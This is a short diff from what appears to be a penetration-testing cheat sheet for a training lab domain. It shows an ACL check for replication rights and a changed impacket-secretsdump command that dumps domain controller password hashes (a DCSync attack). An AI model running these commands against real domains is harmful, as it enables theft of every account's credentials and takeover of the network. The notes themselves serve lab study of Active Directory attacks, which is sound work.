@@ -16,7 +16,7 @@ Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType 
 ```
 
 ```bash
-secretsdump.py -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
+impacket-secretsdump -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
 ```
 
 ```bash
